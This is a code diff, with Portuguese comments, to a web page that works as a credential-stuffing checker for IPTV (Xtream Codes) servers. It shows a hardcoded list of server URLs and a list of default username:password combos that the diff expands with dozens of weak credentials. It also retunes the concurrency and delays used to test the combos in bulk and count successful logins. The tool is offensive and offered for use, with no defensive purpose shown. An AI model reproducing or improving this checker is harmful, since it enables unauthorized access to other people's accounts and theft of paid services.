@@ -435,7 +435,7 @@
 <footer>FEITO POR DARK MENSAGEIRO</footer>
 <div id="notification" role="alert" aria-live="assertive"></div>
 <script>
-  // Lista de servidores (apenas os mais confiáveis)
+  // Lista de servidores Xtream Codes confirmados (atualizada)
   const servers = [
     "http://cdn.jccob.click",
     "http://cinepulse.live",
@@ -569,7 +569,7 @@
     "http://dnsbr.cloud",
     "http://dnsbr.xyz",
     "http://dnsrp.abre.xyz:80",
-    "http://dnssp.site",
+    "http://dnssp.site:80",
     "http://dsmar.mov:80",
     "http://ecliente.xyz",
     "http://fastream.xyz:8080",
@@ -603,7 +603,7 @@
     "http://p1.proiptv.co:88",
     "http://pegcv.xyz:8880",
     "http://pfsrv.com:80",
-    "http://picapaunet.top",
+    "http://picapaunet.top:80",
     "http://piratuga.xyz",
     "http://play.biturl.vip",
     "http://premiumtop.top:8080",
@@ -749,8 +749,8 @@
     "http://gestor.mom"
   ];
   
-  // Lista de combos conhecidos que funcionam (para testes)
-  const knownCombos = [
+  // Lista de combos comuns (baseado em pesquisas na web)
+  const commonCombos = [
     "test:test",
     "demo:demo",
     "admin:admin",
@@ -780,7 +780,56 @@
     "g:g",
     "h:h",
     "i:i",
-    "j:j"
+    "j:j",
+    "k:k",
+    "l:l",
+    "m:m",
+    "n:n",
+    "o:o",
+    "p:p",
+    "q:q",
+    "r:r",
+    "s:s",
+    "t:t",
+    "u:u",
+    "v:v",
+    "w:w",
+    "x:x",
+    "y:y",
+    "z:z",
+    "abc:abc",
+    "qwe:qwe",
+    "asd:asd",
+    "zxc:zxc",
+    "12345:12345",
+    "54321:54321",
+    "qwerty:qwerty",
+    "password:password",
+    "123456:123456",
+    "12345678:12345678",
+    "123456789:123456789",
+    "1234567890:1234567890",
+    "admin123:admin123",
+    "root123:root123",
+    "user123:user123",
+    "pass123:pass123",
+    "test123:test123",
+    "demo123:demo123",
+    "guest123:guest123",
+    "free123:free123",
+    "trial123:trial123",
+    "temp:temp",
+    "temp123:temp123",
+    "temporary:temporary",
+    "tempuser:tempuser",
+    "tempadmin:tempadmin",
+    "temp1234:temp1234",
+    "temp12345:temp12345",
+    "temp123456:temp123456",
+    "temp1234567:temp1234567",
+    "temp12345678:temp12345678",
+    "temp123456789:temp123456789",
+    "temp1234567890:temp1234567890"
   ];
   
   // ===== CONSTANTES & ESTADOS =====
@@ -803,7 +852,7 @@
   let totalHits = 0;
   let totalTested = 0;
   let activeRequests = 0;
-  const MAX_CONCURRENT_REQUESTS = 100; // Aumentado para máxima velocidade
+  const MAX_CONCURRENT_REQUESTS = 20; // Reduzido para evitar sobrecarga
   
   // Função para mostrar notificação visual e sonora
   function showNotification(msg, duration = 5000) {
@@ -840,14 +889,14 @@
       let lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
       combos = lines.filter(l => l.includes(':')); // mínimo username:password
       
-      // Adicionar combos conhecidos para garantir que testemos alguns
-      combos = [...knownCombos, ...combos.slice(0, 100)];
+      // Adicionar combos comuns para garantir que testemos alguns
+      combos = [...commonCombos, ...combos.slice(0, 50)];
       
       showNotification(`${combos.length} combos carregados online.`);
       return true;
     } catch (error) {
-      // Se falhar, usar apenas os combos conhecidos
-      combos = [...knownCombos];
+      // Se falhar, usar apenas os combos comuns
+      combos = [...commonCombos];
       showNotification(`Erro ao carregar combos. Usando ${combos.length} combos de teste.`);
       console.error('Erro ao carregar combos:', error);
       return true;
@@ -1071,8 +1120,8 @@
         // Ignora erros
       }
       
-      // Delay mínimo entre requisições
-      await delay(1);
+      // Delay entre requisições para não sobrecarregar
+      await delay(100);
     }
   }
   
@@ -1100,7 +1149,7 @@
     copyAllBtn.disabled = true;
     
     // Limitar o número de combos para processar
-    const maxCombos = Math.min(1000, combos.length); // Aumentado para 1000
+    const maxCombos = Math.min(200, combos.length); // Limitado para não sobrecarregar
     const combosToProcess = combos.slice(0, maxCombos);
     
     // Processar combos em paralelo com controle de concorrência
@@ -1111,7 +1160,7 @@
       
       // Esperar até que haja slots disponíveis
       while (activeRequests >= MAX_CONCURRENT_REQUESTS && !stopRequested) {
-        await delay(1);
+        await delay(10);
       }
       
       if (stopRequested) break;
